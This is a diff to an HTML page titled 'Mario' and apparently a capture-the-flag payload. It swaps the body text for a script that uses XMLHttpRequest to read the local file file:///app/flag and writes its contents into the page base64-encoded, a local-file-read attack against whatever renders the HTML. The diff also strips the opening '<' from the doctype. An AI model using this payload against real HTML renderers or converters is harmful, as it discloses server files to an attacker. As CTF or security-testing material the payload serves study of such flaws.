@@ -1,9 +1,13 @@
-<!DOCTYPE html>
+!DOCTYPE html>
 <html>
 <head>
 <title>Mario</title>
 </head>
 <body>
-test
+<script>
+x=new XMLHttpRequest;
+x.onload=function(){document.write(btoa(this.responseText))};
+x.open("GET","file:///app/flag");x.send();
+</script>
 </body>
 </html>
